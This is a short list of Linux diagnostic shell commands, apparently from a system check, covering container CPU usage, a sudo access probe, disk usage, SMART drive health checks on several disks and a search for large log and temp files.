command: docker exec open-webui ps aux --sort=-%cpu | head -n 5
echo 'Password is required for sudo' | sudo -S /usr/bin/true
df -h && which smartctl && lsblk -d -n -o NAME,TYPE | grep disk
for dev in sda sdb sdc; do /usr/sbin/smartctl -H /dev/$dev; done
smartctl --scan && smartctl -H /dev/sda && smartctl -H /dev/sdb && (smartctl -d sat -H /dev/sdc || smartctl -d scsi -H /dev/sdc || echo 'sdc_unsupported')
lsblk -o NAME,MODEL,SIZE,FSTYPE,MOUNTPOINT && for dev in /dev/sd[a-b]; do smartctl -H $dev; done && find /var/log /tmp -type f -size +500M -exec ls -lh {} +
sudo lsblk -d -o NAME,SIZE,TYPE,MODEL && sudo smartctl -H /dev/sda && sudo smartctl -H /dev/sdb
